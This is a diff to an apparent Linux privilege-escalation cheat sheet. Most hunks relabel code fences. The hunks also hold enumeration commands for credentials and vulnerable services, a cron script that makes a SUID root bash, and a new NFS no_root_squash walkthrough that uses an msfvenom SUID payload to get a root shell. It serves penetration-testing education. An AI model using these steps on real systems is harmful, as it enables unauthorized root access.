@@ -93,7 +93,7 @@ Otherwise, you may manually add shells to a file:
 
 Enumerate the system distribution type and its version:
 
-```text
+```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null
 cat /etc/issue
@@ -108,7 +108,7 @@ cat /etc/redhat-release
 
 Enumerate the kernel version and architecture:
 
-```text
+```bash
 cat /proc/version
 uname -a
 uname -mrs
@@ -122,7 +122,7 @@ ls /boot | grep vmlinuz
 
 Enumerate environment variables to find information \(like paths, passwords, API keys, programs, etc\):
 
-```text
+```bash
 (env || set) 2>/dev/null
 cat /etc/profile
 cat /etc/bashrc
@@ -137,7 +137,7 @@ set
 
 There are vulnerable sudo versions, it is worth it enumerating these:
 
-```text
+```bash
 sudo -v
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
@@ -146,7 +146,7 @@ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.
 
 We enumerate mounted or unmounted file systems with:
 
-```text
+```bash
 mount
 cat /etc/fstab # (not all drives are listed here, depends on the configuration)
 /bin/lsblk # (list all available disk)
@@ -156,7 +156,7 @@ cat /etc/fstab # (not all drives are listed here, depends on the configuration)
 
 Enumerate the services that are running and their privilege:
 
-```text
+```bash
 ps aux
 ps -ef
 top
@@ -167,7 +167,7 @@ cat /etc/services
 
 Enumerate services that are running as the root user and identify if one is vulnerable to something:
 
-```text
+```bash
 ps aux | grep root
 ps -ef | grep root
 ```
@@ -176,7 +176,7 @@ ps -ef | grep root
 
 Enumerate the version of the program that is running:
 
-```text
+```bash
 absolute/path/of/program_name --version
 program_name --version
 program_name -v
@@ -186,7 +186,7 @@ program_name -v
 
 Enumerate the versions of the installed packages:
 
-```text
+```bash
 dpkg -l #Debian
 rpm -qa #Redhat
 dpkg -l | grep program_name #Debian
@@ -230,7 +230,7 @@ strings process_name | grep -i password
 
 Enumerate which applications are installed, their version, and if they are currently running in the system:
 
-```text
+```bash
 ls -alh /usr/bin/
 ls -alh /sbin/
 dpkg -l
@@ -249,7 +249,7 @@ which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb bas
 
 Enumerate misconfigured services and if they have vulnerable plugins:
 
-```text
+```bash
 find / -iname '*.conf' 2>/dev/null
 find / -iname '*.ini' 2>/dev/null
 locate name_here.conf
@@ -278,7 +278,7 @@ Enumerate if you have `.service` files that you could modify so it executes a sh
 
 Enumerating `.service` files in the host:
 
-```text
+```bash
 find / -iname '*.service' 2>/dev/null
 ```
 
@@ -292,7 +292,7 @@ If we have writable binaries then we can modify them to execute shells when the 
 
 Enumerate the scheduled jobs:
 
-```text
+```bash
 crontab -l
 crontab -u username -l
 ls -alh /var/spool/cron
@@ -312,7 +312,7 @@ cat /var/spool/cron/crontabs/root
 
 Enumerate Cron Jobs with [pspy](https://github.com/DominicBreuker/pspy):
 
-```text
+```bash
 ./pspy64 -pf -i 1000
 ```
 
@@ -338,7 +338,7 @@ If a cron job program/script does **not use an absolute path**, and one of the P
 
 One way we can take exploit this is by doing a SUID bit on bash:
 
-```text
+```bash
 #!/bin/bash
 
 cp /bin/bash /tmp/rootbash
@@ -373,7 +373,7 @@ cat /path/to/cronjob_script.sh
 
 If inside the script there's a line using a wildcard `*` like the following:
 
-```text
+```bash
 tar czf /tmp/filename.tar.gz *
 ```
 
@@ -758,6 +758,79 @@ getcap -r / 2>/dev/null
 ```
 
 ## NFS
+
+The NFS \(Network File System\) file system is a widely used distributed file system. The /etc/exports file is used to set up NFS shares. Remote users can access, create, and modify files, as well as mount shares. Even if they don't exist on the NFS server, new files inherit the remote user's and group's ids \(as owner and group, respectively\).
+
+Show the export list for the NFS server:
+
+```text
+showmount -e <target>
+```
+
+Nmap NSE script:
+
+```text
+nmap –sV –script=nfs-showmount <target>
+```
+
+Mount an NFS share:
+
+```text
+mount -o rw,vers=2 <target>:<share> <local_directory>
+```
+
+### Root Squashing
+
+NFS uses root squashing by default to prevent privilege escalation, however, this configuration may be disabled. If the remote user is or claims to be root, NFS will “squash” the user and treat them as the “nobody” user, belonging to the “nogroup” group.
+
+### no\_root\_squash
+
+Root squashing is disabled via the no\_root\_squash NFS configuration option. A remote user who identifies as "root" and is included in a writable share configuration can create files on the NFS share as the root user.
+
+#### no\_root\_squash Privilege Escalation
+
+1. With the no\_root\_squash option, check the contents of /etc/exports for shares:
+
+   ```text
+   cat /etc/exports
+   ...
+   /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+   ```
+
+2. Ensure that the NFS share is accessible from a remote location:
+
+   ```text
+   $ showmount -e 192.168.1.10
+   Exports list on 192.168.1.10:
+   /tmp
+   ```
+
+3. Mount the /tmp NFS share on your local system by creating a mount point:
+
+   ```text
+   mkdir /tmp/nfs
+   mount -o rw,vers=2 192.168.10.10:/tmp /tmp/nfs
+   ```
+
+4. Create a payload and store it to the mounted share as the root user on your local host \(e.g Kali or Parrot\):
+
+   ```text
+   msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+   ```
+
+5. Set a SUID bit on the file and make it executable by anyone:
+
+   ```text
+   chmod +xs /tmp/nfs/shell.elf
+   ```
+
+6. To acquire a root shell on the target machine, run the following command:
+
+   ```text
+   $ /tmp/shell.elf
+   bash-4.1# id
+   uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
+   ```
 
 ## Container
 
